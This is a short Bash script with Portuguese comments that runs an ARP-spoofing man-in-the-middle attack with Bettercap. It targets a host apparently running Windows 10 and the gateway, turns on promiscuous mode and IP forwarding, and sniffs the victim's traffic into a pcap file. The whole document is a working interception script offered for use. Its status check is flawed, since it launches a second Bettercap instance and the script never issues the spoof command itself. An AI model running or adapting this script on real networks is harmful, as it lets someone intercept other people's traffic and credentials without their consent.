#!/bin/bash

# Defina a interface de rede
INTERFACE="eth0"

# Endereço do gateway e alvo (agora com o IP correto do Windows 10)
GATEWAY="192.168.0.1"
TARGET="192.168.0.3"  # Substitua pelo IP do Windows 10

# Caminho do arquivo de captura
PCAP_FILE="capture.pcap"

# Exibe uma mensagem de instrução para o usuário
echo ""
echo "============================================================================"
echo "Digite: arp.spoof on para iniciar ARP spoofing e arp.spoof off para parar   "
echo "============================================================================"
echo ""

# Ativa o modo promíscuo na interface
echo "Ativando o modo promíscuo na interface $INTERFACE"
echo ""
sudo ip link set $INTERFACE promisc on

# Habilita o encaminhamento de pacotes (IP Forwarding)
echo "Habilitando o IP Forwarding"
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
echo ""
# Inicia o Bettercap com as configurações básicas e ativa ARP spoofing
echo "Iniciando o Bettercap com as configurações de ARP spoofing e captura de pacotes em: $PCAP_FILE"
echo ""
sudo bettercap -iface $INTERFACE -eval "
  set arp.spoof.targets $TARGET,$GATEWAY;
  set net.sniff.output $PCAP_FILE;  
  net.sniff on;
"

# Verifica se o ARP spoofing foi ativado corretamente
ARP_STATUS=$(sudo bettercap -iface $INTERFACE -eval "show arp.spoof")

if [[ $ARP_STATUS == *"on"* ]]; then
  echo "ARP spoofing está ativado e a captura de pacotes está em andamento."
else
  echo "Erro ao ativar o ARP spoofing. Tente novamente."
fi

# Mensagem final indicando onde o tráfego foi salvo
echo ""
echo "Captura de pacotes foi salva em: $PCAP_FILE"
echo "Se desejar parar a captura ou ARP spoofing, digite 'arp.spoof off'."
